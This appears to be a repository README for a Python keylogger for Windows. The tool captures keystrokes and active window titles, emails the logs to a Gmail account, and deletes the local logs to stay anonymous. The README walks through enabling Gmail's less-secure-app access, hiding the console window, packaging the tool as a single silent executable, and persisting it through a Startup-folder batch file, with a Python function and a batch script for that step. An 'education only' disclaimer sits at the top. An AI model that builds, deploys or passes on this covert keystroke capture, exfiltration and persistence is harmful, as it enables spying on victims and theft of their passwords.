# CSL_KeyLogger_Windows
A Keylogger written in Python 3.6 that takes in user input, stores the data log, and then sends it to an email address. The data log is destroyed after the email is sent to remain anonymous.

<hr />

<h1>DISCLAIMER</h1>
This program is for education/research purposes only. The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided. The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of ANY files provided. By using CSL_KeyLogger_Windows or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. This program is ONLY intended for use on your own pentesting labs, or with explicit consent from the owner of the property being tested.

<h2>Windows installation of python modules:</h2>
<strong>Download pyWin32 and pyHook modules from here, these libraries are required:</strong>
https://www.lfd.uci.edu/~gohlke/pythonlibs/

<strong>Troubleshooting:</strong>
<ul>
 	<li>-ensure that your python version matches the module you are installing, or you will get errors when installing the modules.</li>
 	<li>-If you get an error, try installing the alternate version of the same version of the module as your python version.
An example is if you download pyHook-1.5.1-cp36-cp36m-win_amd64 and you get an error, then try pyHook-1.5.1-cp36-cp36m-win32.</li>
 	<li>-majority of the times an error occurs when installing modules is usually from either a mismatch of versions with the module and python, or pip is not up to date.</li>
 	<li>-to update pip
python -m pip install --upgrade pip</li>
</ul>
&nbsp;

<hr />

<h1>Guide on how to install Python Modules on Windows:</h1>
<strong>Open up the windows Command prompt as admin:</strong>
<ul>
 	<li>change to d drive if you have pythons executable here (in my case its in the d drive):
d:</li>
 	<li>change directory to the python exe:
cd D:\YourPath\venv\Scripts</li>
 	<li>now we want to install the pyHook module from this directory with pip, (my path is the following, change the path to wherever you have stored the .whl module):
py -3.6 -m pip install C:\Users\YourPath\pywin32-223-cp36-cp36m-win32.whl</li>
 	<li>now we want to install the pyWin32 module from this library with pip, (my path is the following, change the path to wherever you have stored the .whl module):
py -3.6 -m pip install C:\Users\YourPath\pywin32-223-cp36-cp36m-win32.whl</li>
</ul>
&nbsp;

<img src="https://offseclab.com/wp-content/uploads/2018/03/installinglibraries.png" />

<hr />

<h2>Troubleshooting:</h2>
<ul>
 	<li><strong>SMTPAuthenticationError when sending mail using gmail FIX:</strong></li>
</ul>
When using googles mail server, the email that you are using will be blocked for any sign-in attempts with the python program unless better security standards are in place. Because of this we need to enable access to less secure apps to allow us to send emails to this gmail account with the python program.

Sign into the gmail account that you want to use with the python program, and press the <strong>Turn On</strong> toggle button:
<a href="https://www.google.com/settings/security/lesssecureapps">https://www.google.com/settings/security/lesssecureapps</a>

<img  src="https://offseclab.com/wp-content/uploads/2018/03/toggle.png" />
<ul>
 	<li><strong>Python IDLE issues, keylogger is not picking up keys FIX:</strong></li>
</ul>
If you are dealing with this issue with the IDLE, then delete the contents in the .idlerc folder located within your user profile of your computer. To find the folder check your user profile name followed by %APPDATA% and look for a folder called.<b>".idlerc"</b>. Delete everything in that folder, and you should be able to run the program through python IDLE.

<img  src="https://offseclab.com/wp-content/uploads/2018/03/deletethis.png"  />

<h2>Output:</h2>
<strong>Running the Program:</strong>
Open IDLE, or PyCharm, or whatever text editor, or IDE that you prefer for python and run the program. The python program outputs the values it picks up from the key presses using the print statements. This is a good way to see how the keylogger works. If you want to hide the DOS shell window that appears when running the python program, change the file extension from <b>".py"</b> to <b>".pyw"</b>.


<strong>Here is an example of the program running. This is the output after first going to notepad and typing some words, then going to google. This is to show how the program marks the windows/programs the target is currently on.</strong>


<img  src="https://offseclab.com/wp-content/uploads/2018/03/python2.png" />

<img  src="https://offseclab.com/wp-content/uploads/2018/03/python3.png" />

<img  src="https://offseclab.com/wp-content/uploads/2018/03/python4.png"  />

<strong>This is how the log file(s) store the logged keys:</strong>
<img  src="https://offseclab.com/wp-content/uploads/2018/03/python5.png"  />

<strong>This is the sent keys logged to the email specified:</strong>
<img  src="https://offseclab.com/wp-content/uploads/2018/03/python6.png"  />

<hr />

<h2>Creating the Executable:</h2>
When creating the executable file you want to use the python module, <b>pyinstaller</b>. This allows the program to be ran anywhere. The first thing required is the pyinstaller module, so install it using pip:

<div style="background: #000000; color: #00ff00; overflow: auto; width: auto; border: solid gray; border-width: .1em .1em .1em .8em; padding: .2em .6em;">
<pre style="margin: 0;">
pip install pyinstaller
</pre>
</div>

Then type the following command on your windows command prompt to create the executable:
<div style="background: #000000; color: #00ff00; overflow: auto; width: auto; border: solid gray; border-width: .1em .1em .1em .8em; padding: .2em .6em;">
<pre style="margin: 0;">
pyinstaller -w -F name_of_python_script.py
</pre>
</div>

The -w removes the opening of prompt window, while -F ensures that the executable is a single file that includes everything, rather then a folder. Once that's done navigate to the <b>dist</b> folder within the folder of your newly created python script, and grab the exe file.

The file is now created.

<hr />

<h2>Persistenly Run KeyLogger on Startup:</h2>
On Windows devices there is a startup folder that determines which applications will run on startup. This folder is where some attackers will store their keyloggers, in some cases they will mask it as a another program. Essentially this is done by implementing a python function that creates a bat file that runs the <b>'start'</b> command, followed by the file path to the keylogger to execute the program. Or a general bat file stored in the startup folder that contains the following script with the commands will work.

Here is the python function that can be included in the program which creates the bat file. (I have included the full program with log deletion and bat startup under "key_log_win_withBATCreation.pyw"):
<div style="background: #000000; color: #00ff00; overflow: auto; width: auto; border: solid gray; border-width: .1em .1em .1em .8em; padding: .2em .6em;">
<pre style="margin: 0;">import getpass as gp
usern = gp.getuser()

def bat_create_file(path_log=""):
    bat_path = r'C:\Users\%s\YourPath\Startup' % usern
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % path_log)

bat_create_file(path_log)
</pre>
</div>
Sometimes a separate bat file is used instead of having a built-in function:
<div style="background: #000000; color: #00ff00; overflow: auto; width: auto; border: solid gray; border-width: .1em .1em .1em .8em; padding: .2em .6em;">
<pre style="margin: 0;">REM Place in startup folder
start "" path_log/myProgram.exe
exit</pre>
</div>


